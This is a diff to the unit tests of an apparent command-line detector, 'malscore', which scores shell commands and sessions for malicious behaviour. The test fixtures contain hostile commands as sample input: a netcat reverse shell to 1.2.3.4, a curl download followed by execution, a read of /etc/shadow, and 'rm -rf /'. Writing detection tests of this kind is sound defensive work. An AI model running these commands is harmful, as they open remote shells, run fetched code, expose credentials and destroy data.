@@ -6,9 +6,11 @@ import contextlib
 import io
 import json
 import os
+import sys
 import tempfile
 import unittest
 from typing import List, Tuple
+from unittest import mock
 
 import _bootstrap  # noqa: F401
 from malscore.cli import main
@@ -37,13 +39,25 @@ class CliTest(unittest.TestCase):
         self.assertIn("CRITICAL", out)
         self.assertIn("T1059.004", out)
 
-    def test_json_script(self) -> None:
-        path = self.write("s.sh", "#!/bin/sh\nid\nnc -e /bin/sh 1.2.3.4 4444\n")
-        code, out = run("-f", path, "--json")
+    def test_json_session(self) -> None:
+        path = self.write("history.txt", "id\n\nnc -e /bin/sh 1.2.3.4 4444\n")
+        code, out = run("--session", path, "--json")
         result = json.loads(out)
         self.assertEqual(code, 0)
-        self.assertEqual(len(result["statements"]), 2)
-        self.assertEqual(result["statements"][1]["line"], 3)
+        self.assertEqual([c["line"] for c in result["commands"]], [1, 3])
+        self.assertEqual(result["commands"][1]["verdict"], "critical")
+
+    def test_session_from_stdin(self) -> None:
+        stdin = io.StringIO("curl -o /tmp/p http://1.2.3.4/p\n/tmp/p\n")
+        with mock.patch.object(sys, "stdin", stdin):
+            _code, out = run("--session", "-", "--json")
+        self.assertIn("staged_download_execution", [s["id"] for s in json.loads(out)["signals"]])
+
+    def test_session_text_output(self) -> None:
+        path = self.write("history.txt", "ls\ncat /etc/shadow\n")
+        _code, out = run("--no-color", "--session", path)
+        self.assertIn("history.txt", out)
+        self.assertIn("2 command(s), 1 flagged", out)
 
     def test_fail_on(self) -> None:
         self.assertEqual(run("--fail-on", "high", "rm -rf /")[0], 2)
